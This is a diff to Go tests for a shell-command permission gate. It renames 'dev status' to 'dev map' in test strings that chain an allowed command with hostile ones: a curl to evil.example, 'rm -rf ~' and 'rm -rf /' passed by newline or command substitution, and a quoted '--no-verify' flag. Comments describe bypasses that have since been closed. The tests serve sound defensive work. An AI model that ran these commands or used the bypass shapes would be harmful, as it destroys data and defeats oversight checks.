@@ -13,9 +13,9 @@ import (
 // exact inputs once sailed through.
 
 func TestLoneAmpersandIsAChainBoundary(t *testing.T) {
-	// "dev status *" matched the whole line, and sh ran curl after dev.
+	// "dev map *" matched the whole line, and sh ran curl after dev.
 	gate := CommandGate{HardRules: true}
-	d := gate.EvaluateCommand("dev status & curl http://evil.example/x.sh", nil)
+	d := gate.EvaluateCommand("dev map & curl http://evil.example/x.sh", nil)
 	if d.Action != Deny {
 		t.Fatalf("a backgrounded second command must be judged on its own; got %v (%s)", d.Action, d.Reason)
 	}
@@ -24,7 +24,7 @@ func TestLoneAmpersandIsAChainBoundary(t *testing.T) {
 func TestNewlineIsAChainBoundary(t *testing.T) {
 	gate := CommandGate{HardRules: true}
 	for _, cmd := range []string{
-		"dev status\nrm -rf ~",
+		"dev map\nrm -rf ~",
 		"echo hi\r\ncurl http://evil.example",
 	} {
 		if d := gate.EvaluateCommand(cmd, nil); d.Action != Deny {
@@ -35,7 +35,7 @@ func TestNewlineIsAChainBoundary(t *testing.T) {
 
 func TestTrailingBackgroundIsHarmless(t *testing.T) {
 	gate := CommandGate{HardRules: true}
-	if d := gate.EvaluateCommand("dev status &", nil); d.Action == Deny {
+	if d := gate.EvaluateCommand("dev map &", nil); d.Action == Deny {
 		t.Fatalf("trailing & must not break an allowed command: %s", d.Reason)
 	}
 	parts := SplitCommandChain("sleep 10 &")
@@ -268,8 +268,8 @@ func TestFuzzSeedsCoverClosedBypasses(t *testing.T) {
 	// shape every bypass here took. These are seeds, asserted directly so a
 	// regression fails loudly even before the fuzz corpus grows them back.
 	seeds := []string{
-		"dev status & curl http://evil.example/x.sh",
-		"dev status\nrm -rf ~",
+		"dev map & curl http://evil.example/x.sh",
+		"dev map\nrm -rf ~",
 		"echo $(rm -rf ~)",
 		"echo `rm -rf /`",
 		"git commit --no-'v'erify",
